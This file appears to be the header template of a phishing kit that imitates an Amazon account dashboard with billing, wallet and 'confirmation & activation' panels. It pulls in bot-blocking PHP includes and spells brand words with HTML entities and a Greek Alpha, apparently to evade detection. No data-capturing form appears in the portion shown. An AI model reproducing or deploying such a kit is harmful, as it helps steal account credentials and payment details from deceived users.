<?php include ('../bots.php');?>
<?php include ('../blocker.php');?>
<?php include ('../banned.php');?>
<!DOCTYPE html">
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition" data-19ax5a9jf="dingo" data-aui-build-date="3.16.3.3-2016-03-08">
  <head>
    <link rel="shortcut icon" type="image/x-icon" href="../data/icon/favicon.ico">
    <script async="" src="../data/js/details-js.js"></script>
    <a id="nav-top">
    </a>
    <meta charset="utf-8">
    <meta http-equiv="icon-Type" icon="text/html; charset=UTF-8"/>  
    <title>Your &Alpha;m&#97;zon &#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;
    </title>
    <div id="navbar" role="navigation" class="nav-sprite-v1 nav-bluebeacon"> 
      <link rel="stylesheet" href="../data/css/nav-hiden.css">  
      <link rel="stylesheet" href="../data/css/details-css.css">
      <link rel="stylesheet" href="../data/css/familly.css">
      <link rel="stylesheet" href="../data/css/details-css.min.css">
      <style type="text/css">
        <!--
        .nav-sprite-v1 .nav-sprite, .nav-sprite-v1 .nav-icon {
          background-image: url(../data/icon/nav.png);
          background-position: 0 1000px;
          background-repeat: repeat-x;
        }
        .nav-spinner {
          background-image: url(../data/icon/snake.gif);
          background-position: center center;
          background-repeat: no-repeat;
        }
        .nav-timeline-icon, .nav-access-image {
          background-image: url(../data/icon/timeline.png);
          background-repeat: no-repeat;
        }
        --></style>
      <div id="nav-belt">
        <div class="nav-left">       
          <div id="nav-logo">
            <a href="#" class="nav-logo-link" tabindex="6">
              <span class="nav-logo-base nav-sprite">&Alpha;m&#97;zon
              </span>
              <span class="nav-logo-ext nav-sprite">
              </span>
              <span class="nav-logo-locale nav-sprite">
              </span>
            </a>
            <a href="#" aria-label="" tabindex="7" class="nav-logo-tagline nav-sprite nav-prime-try">&#x54;&#x72;&#x79;&#x20;&#x50;&#x72;&#x69;&#x6D;&#x65;
            </a>
          </div>
        </div>
        <div class="nav-right">
          <div id="nav-swmslot">
            <div id="navSwmHoliday" data-nav-slot="nav-superswm-9" data-nav-cid="458663262-1" style="background-image: url(../data/icon/beauty.jpg); width: 400px; height: 39px; overflow: hidden;">
              <img alt="Subscribe and Save" src="../data/icon/transparent.gif" border="0" width="400px" height="39px" usemap="#nav-swm-holiday-map">
            </div>
          </div>
        </div>
        <div class="nav-fill">
          <div id="nav-search">
            <div id="nav-bar-left">
            </div>
            <form accept-charset="utf-8" action="" class="nav-searchbar" method="GET" name="site-search" role="search">
              <div class="nav-left">
                <div class="nav-search-scope nav-sprite">
                  <div class="nav-search-facade" data-value="search-alias=aps">
                    <span class="nav-search-label" style="width: auto;">All
                    </span>
                    <i class="nav-icon">
                    </i>
                  </div>
                </div>
              </div>
              <div class="nav-right">
                <div class="nav-search-submit nav-sprite">
                  <span id="nav-search-submit-text" class="nav-search-submit-text nav-sprite">
                  </span>
                  <input  class="nav-input" value="Go" tabindex="20">
                </div>
              </div>
              <div class="nav-fill">
                <div class="nav-search-field">
                  <input type="text" id="twotabsearchtextbox" value="" name="field-keywords" autocomplete="off" class="nav-input" tabindex="19">
                </div>
                <div id="nav-iss-attach">
                </div>
              </div>
            </form>
          </div>
        </div>
        <div id="nav-flyout-wishlist" class="nav-coreFlyout nav-flyout">
          <div class="nav-arrow">
            <div class="nav-arrow-inner">
            </div>
          </div>
          <div class="nav-template nav-flyout-content nav-tpl-itemList">  
          </div>
        </div>
      </div>
      <div id="nav-main" class="nav-sprite">
        <div class="nav-left">
          <div id="nav-shop">
            <a href="#" class="nav-a nav-a-2" id="nav-link-shopall" tabindex="36">
              <span class="nav-line-1">Hello. &#x43;&#x75;&#x73;&#x74;&#x6F;&#x6D;&#x65;&#x72;
              </span>
              <span class="nav-line-2">&#x59;&#x6F;&#x75;&#x72;&#x20;&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;
                <span class="nav-icon nav-arrow" style="visibility: visible;">
                </span>
              </span>
            </a>
          </div>
        </div>
      </div>
      <div id="nav-subnav">
      </div>
    </div>
    </header>
  <div class="a-section a-spacing-none p13n-yourstore" style="width:100%">
    <div id="hud-dashboard" class="a-section">
      <div class="a-section a-spacing-none item-container">
        <a class="a-link-normal" title="View/Edit Profile" href="#">
          <div class="a-section a-spacing-none">
            <div class="profile-image">
            </div>
          </div>
        </a>
      </div>
      <div class="a-section a-spacing-none item-container customer-name-container">
        <div class="a-section a-spacing-none customer-name">
          <a href="#">Your &Alpha;m&#97;zon
            <br>&#x61;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;
          </a>
        </div>
      </div>
      <div id="open-orders" class="hud-carousel-element hud-no-paginate hud-no-paginate-first">
        <div class="a-section label">&#x59;&#x6F;&#x75;&#x72;&#x20;&#x62;&#x69;&#x6C;&#x6C;&#x69;&#x6E;&#x67;&#x20;&#x61;&#x64;&#x64;&#x72;&#x65;&#x73;&#x73;  &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
        </div>
        <div class="a-section value"> &nbsp; &nbsp; &nbsp;  &nbsp;        
          <img src="../data/icon/Floating-rays.gif" height="28" width="28" align="center" >
          </img>
      </div>
      <div class="a-section subtext">&nbsp;
      </div>
    </div>
    <div id="open-orders" class="hud-carousel-element hud-no-paginate hud-no-paginate-first">
      <div class="a-section label">&#x59;&#x6F;&#x75;&#x72;&#x20;&#x57;&#x61;&#x6C;&#x6C;&#x65;&#x74;
      </div>
      <div class="a-section value"> &nbsp;&nbsp;    
        <img src="../data/icon/Floating-rays.gif" height="28" width="28" align="center" >
        </img>
    </div>
  </div>
  <div id="AudibleTrialUpsell" class="hud-carousel-element hud-no-paginate">
    <span class="a-declarative" data-action="a-modal">
      <div class="a-section label">&#x43;&#x4F;&#x4E;&#x46;&#x49;&#x52;&#x4D;&#x41;&#x54;&#x49;&#x4F;&#x4E;&#x20;&amp;&#x20;&#x41;&#x43;&#x54;&#x49;&#x56;&#x41;&#x54;&#x49;&#x4F;&#x4E;
      </div>
      <div class="a-section value"> &nbsp;&nbsp;  &nbsp; &nbsp; &nbsp;&nbsp;   
        <img src="../data/icon/success-01-128.png" height="28" width="28" align="center" >
        </img>
      </div>
    </span>
  </div>
</div>
</div>		
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/AmazonUI-8e024716f6ecd620c6afe8bb94bc41ec5ad46343._V2_.css#AUIClients/AmazonUI.rendering_engine-not-trident.secure.min">
<style>
  .a-container {
    min-width: 0;
  }
  .hidden {
    display: none;
  }
  .breadcrumb {
    font-family: Arial,Helvetica,sans-serif;
    font-size: 18px;
  }
  .breadcrumb a, .breadcrumb a:visited {
    color: #004B91;
    padding-right: 0.3em;
  }
  .breadcrumb a:hover {
    color: #E47911;
    text-decoration: none;
  }
  .breadcrumbArrow {
    color: #CCCCCC !important;
    font-size: 18px;
  }
  #walletWebsiteContentColumn {
    /* both specified by mocks */
    min-width: 450px;
    max-width: 620px;
  }
  #walletWebsiteContainer {
    margin: 0;
    /* Padding is specified by mocks */
    padding: 20px 24px;
  }
  // This rule has been copied from AUI, however their rule contains an only child selector
  // which causes this rule to break in IE8 and below. There is an open jira for this
  // issue, which can be found here: https://jira2.amazon.com/browse/SC-1336
  .a-alert-error .a-alert-container h4 {
    color: #C40000;
  }
  #subHeaderRow {
    margin-bottom: 2px;
  }
  .leftNavbarSection {
    /* Width is specified by mocks */
    width: 200px;
    display: table;
    border-collapse: collapse;
  }
  .leftNavbarRow {
    display: table-row;
  }
  .leftNavbarColumn {
    border-top: 1px solid;
    font-family: Arial, Verdana, sans-serif;
    font-size: 14px;
    display: table-cell;
    border-color: #CCCCCC;
  }
  .leftNavbarColumn.first {
    border-top: 0px none;
  }
  .linkSection {
    padding-top: 20px;
    padding-bottom: 20px;
  }
  .linkSection.first {
    padding-top: 0px;
  }
  .linkSection a {
    padding-bottom: 10px;
    display: inline-block;
  }
</style>
</head>
